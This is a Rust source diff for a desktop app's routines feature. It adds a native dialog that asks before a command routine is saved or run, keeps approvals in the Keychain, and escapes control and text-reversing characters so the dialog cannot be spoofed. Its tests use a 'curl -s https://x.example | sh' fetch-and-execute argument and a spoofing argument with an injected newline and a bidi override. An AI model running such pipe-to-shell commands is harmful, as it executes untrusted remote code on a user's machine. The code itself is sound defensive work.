@@ -1,6 +1,7 @@
 //! Routines for the Day tab: agent prompts and commands the user set up, run by id. The
 //! webview only ever names a routine by its id; what runs comes from `routines.json`.
 
+pub mod approve;
 pub mod run;
 pub mod schedule;
 pub mod store;
@@ -9,9 +10,11 @@ use super::actions::{home_dir, ready, switched_on};
 use super::cli::{real_cli, Cli};
 use super::projects::read_trusted;
 use super::pty::{blocking, cached_login_env, LoginCache};
+use crate::connectors::keychain::Keychain;
 use std::path::PathBuf;
-use store::{RoutineKind, Routines, Run};
+use store::{Routine, RoutineKind, Routines, Run};
 use tauri::{AppHandle, Emitter};
+use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
 
 /// Emitted when the routines or a run change; the payload is empty.
 pub const CHANGED_EVENT: &str = "routines:changed";
@@ -36,9 +39,14 @@ pub fn launch(
     let title = routine.title.clone();
     let is_agent = matches!(routine.kind, RoutineKind::Agent { .. });
     let claim = run::claim(id)?;
+    let scheduled_for_is_none = scheduled_for.is_none();
     let started = run::begin(id, scheduled_for);
-    if let Err(e) = store::validate(routine) {
-        // E.g. the program was deleted since: the Day tab shows it and a scheduled run notifies.
+    let refused = store::validate(routine).err().or_else(|| {
+        (!command_allowed(app, routine, scheduled_for_is_none)).then(|| NOT_ALLOWED.to_string())
+    });
+    if let Some(e) = refused {
+        // E.g. the program was deleted since, or the command was never allowed: the Day tab
+        // shows it and a scheduled run notifies.
         let done = run::failed(started, e);
         schedule::record_final(&app_dir, &title, &done, &|m| schedule::notify(app, &m));
         drop(claim);
@@ -89,7 +97,94 @@ pub async fn routines_get(state: tauri::State<'_, super::AgentsState>) -> Result
     blocking(move || Ok(store::read_routines(&dir))).await
 }
 
+/// The error of a save whose new or changed command was not allowed in the native dialog.
+pub const NOT_CONFIRMED: &str = "Not saved: the command was not allowed";
+/// The message of a run refused because its command was never allowed (e.g. written into
+/// `routines.json` by hand), or not allowed when asked.
+pub const NOT_ALLOWED: &str = "Not allowed: run it by hand or save it in Settings to allow it";
+
+/// Whether a command routine may run (an agent routine always may). A command not allowed yet
+/// asks in the native dialog when started by hand; a scheduled run never asks and is refused.
+/// Blocks while the dialog is open: call it on a blocking thread.
+fn command_allowed(app: &AppHandle, routine: &Routine, by_hand: bool) -> bool {
+    if approve::fingerprint(routine).is_none() {
+        return true;
+    }
+    let _held = store::SAVE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+    let mut approved = approve::load(&Keychain);
+    if approve::allowed(&approved, routine) {
+        return true;
+    }
+    if !by_hand || !confirm_commands(app, &[routine]) {
+        return false;
+    }
+    approved.extend(approve::fingerprint(routine));
+    if let Err(e) = approve::save(&Keychain, &approved) {
+        // Allowed for this run; it will ask again next time.
+        log::warn!("[routines] could not keep the allowed command: {e}");
+    }
+    true
+}
+
+/// Shows control characters (and the marks that reorder text) as escapes, so an argument can't
+/// fake extra lines or hide what follows; everything else is shown as typed.
+fn shown(v: &str) -> String {
+    if v.is_empty() {
+        return "\"\"".into();
+    }
+    v.chars()
+        .map(|c| match c {
+            '\n' => "\\n".into(),
+            '\t' => "\\t".into(),
+            '\r' => "\\r".into(),
+            c if c.is_control() || matches!(c, '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}') => {
+                format!("\\u{{{:04X}}}", c as u32)
+            }
+            c => c.to_string(),
+        })
+        .collect()
+}
+
+/// The text of the dialog that confirms new or changed command routines: each one's program,
+/// arguments (one per line) and working folder, as saved.
+pub fn confirm_text(commands: &[&Routine]) -> String {
+    let mut out = String::from(if commands.len() == 1 {
+        "This routine will run a program on your Mac, by hand or on its schedule, without asking again."
+    } else {
+        "These routines will run programs on your Mac, by hand or on their schedule, without asking again."
+    });
+    for r in commands {
+        let RoutineKind::Command { program, args, cwd } = &r.kind else { continue };
+        out.push_str(&format!("\n\n\u{201C}{}\u{201D}\nProgram: {}\n", shown(&r.title), shown(program)));
+        if args.is_empty() {
+            out.push_str("Arguments: none\n");
+        } else {
+            out.push_str("Arguments:\n");
+            for a in args {
+                out.push_str(&format!("    {}\n", shown(a)));
+            }
+        }
+        out.push_str(&format!("Working folder: {}", shown(cwd)));
+    }
+    out.push_str("\n\nAllow only commands you set up yourself.");
+    out
+}
+
+/// Asks in a native dialog (out of the webview's reach) whether to save these commands.
+/// Blocks until answered: call it on a blocking thread, never the main one.
+fn confirm_commands(app: &AppHandle, commands: &[&Routine]) -> bool {
+    app.dialog()
+        .message(confirm_text(commands))
+        .title(if commands.len() == 1 { "Allow this command?" } else { "Allow these commands?" })
+        .kind(MessageDialogKind::Warning)
+        .buttons(MessageDialogButtons::OkCancelCustom("Allow".into(), "Cancel".into()))
+        .blocking_show()
+}
+
 /// Validates and saves all routines (new ones get an id) and drops the runs of deleted ones.
+/// A command routine that is new, or whose program, arguments or folder changed since it was
+/// allowed, is saved only once allowed in a native dialog; Cancel saves nothing. The allowed
+/// commands are kept in the Keychain (see `approve`).
 #[tauri::command]
 pub async fn routines_save(
     app: AppHandle,
@@ -98,9 +193,22 @@ pub async fn routines_save(
 ) -> Result<Routines, String> {
     switched_on(&state)?;
     let dir = state.app_dir.clone();
+    let handle = app.clone();
     let saved = blocking(move || {
+        // Held through the dialog, so two saves don't interleave their allowed commands.
         let _held = store::SAVE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
-        let saved = store::save_routines(&dir, routines)?;
+        let saved = store::prepare(routines)?;
+        let approved = approve::load(&Keychain);
+        let to_confirm = approve::to_confirm(&approved, &saved);
+        if !to_confirm.is_empty() && !confirm_commands(&handle, &to_confirm) {
+            return Err(NOT_CONFIRMED.into());
+        }
+        // Allowed first: a command in routines.json without its fingerprint never runs.
+        let keep = approve::of_all(&saved);
+        if keep != approved {
+            approve::save(&Keychain, &keep)?;
+        }
+        store::write_routines(&dir, &saved)?;
         let _ = store::update_runs(&dir, |runs| {
             runs.retain(|r| saved.routines.iter().any(|x| x.id == r.routine_id))
         });
@@ -122,18 +230,19 @@ pub async fn routines_run(
     blocking(move || launch(&app, dir, login, &id, None)).await
 }
 
-/// The last run of each saved routine.
+/// The last run of each saved routine, with a command's last output line while the app still
+/// remembers it. An unreadable runs file is an error (scheduled runs wait meanwhile).
 #[tauri::command]
 pub async fn routines_runs(state: tauri::State<'_, super::AgentsState>) -> Result<Vec<Run>, String> {
     switched_on(&state)?;
     let dir = state.app_dir.clone();
     blocking(move || {
         let all = store::read_routines(&dir);
-        let runs = store::read_runs(&dir)
+        let runs = store::read_runs(&dir)?
             .into_iter()
             .filter(|r| all.routines.iter().any(|x| x.id == r.routine_id))
             .collect();
-        Ok(run::settle(runs, &run::is_running))
+        Ok(run::settle(store::with_output(&dir, runs), &run::is_running))
     })
     .await
 }
@@ -209,6 +318,58 @@ pub async fn routines_open_link(
     switched_on(&state)?;
     let dir = state.app_dir.clone();
     blocking(move || open_target(&stored_target(&store::read_routines(&dir), &section_id, Some(index))?)).await
+}
+
+#[cfg(test)]
+mod confirm_tests {
+    use super::*;
+
+    fn command(id: &str, program: &str, args: &[&str], cwd: &str) -> Routine {
+        Routine {
+            id: id.into(),
+            section_id: "s1".into(),
+            title: "Hours".into(),
+            idle_hint: String::new(),
+            kind: RoutineKind::Command {
+                program: program.into(),
+                args: args.iter().map(|a| a.to_string()).collect(),
+                cwd: cwd.into(),
+            },
+            result_link: None,
+            schedule: None,
+        }
+    }
+
+    #[test]
+    fn prepared_new_routines_get_ids_that_are_not_saved_yet() {
+        let mut r = command("", "/bin/echo", &[], "/tmp");
+        r.section_id = "s1".into();
+        let sections = vec![store::Section { id: "s1".into(), name: "Day".into(), links: vec![] }];
+        let prepared = store::prepare(Routines { sections, routines: vec![r] }).unwrap();
+        assert!(!prepared.routines[0].id.is_empty());
+        assert_eq!(approve::to_confirm(&Default::default(), &prepared).len(), 1);
+    }
+
+    #[test]
+    fn dialog_shows_program_args_and_folder_as_saved() {
+        let r = command("a", "/bin/sh", &["-c", "curl -s https://x.example | sh", ""], "/Users/me/work dir");
+        let text = confirm_text(&[&r]);
+        assert!(text.contains("\u{201C}Hours\u{201D}"), "{text}");
+        assert!(text.contains("Program: /bin/sh\n"), "{text}");
+        assert!(text.contains("\n    -c\n    curl -s https://x.example | sh\n    \"\"\n"), "{text}");
+        assert!(text.contains("Working folder: /Users/me/work dir"), "{text}");
+        // An argument can't add a line of its own or reverse what follows.
+        let sneaky = command("a", "/bin/sh", &["x\nWorking folder: /safe", "a\u{202E}b"], "/tmp");
+        let text = confirm_text(&[&sneaky]);
+        assert!(text.contains("    x\\nWorking folder: /safe\n"), "{text}");
+        assert!(text.contains("a\\u{202E}b"), "{text}");
+        assert_eq!(text.matches("\nWorking folder: ").count(), 1, "{text}");
+        // Without arguments, and with two routines: both listed.
+        let bare = command("b", "/bin/date", &[], "/tmp");
+        let text = confirm_text(&[&r, &bare]);
+        assert!(text.contains("Program: /bin/date\nArguments: none\n"), "{text}");
+        assert!(text.starts_with("These routines"), "{text}");
+    }
 }
 
 #[cfg(test)]
